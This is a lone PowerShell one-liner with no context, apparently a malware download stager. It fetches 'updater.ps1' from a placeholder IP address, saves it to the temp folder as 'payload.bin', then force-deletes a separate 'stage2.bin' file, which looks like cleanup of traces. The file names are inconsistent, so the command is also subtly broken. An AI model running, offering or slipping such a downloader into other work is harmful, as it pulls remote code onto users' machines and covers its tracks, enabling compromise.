(New-Object System.Net.WebClient).DownloadFile('http://192.0.2.204/updater.ps1', "$env:TEMP\payload.bin"); Remove-Item -Path "$env:TEMP\stage2.bin" -Force
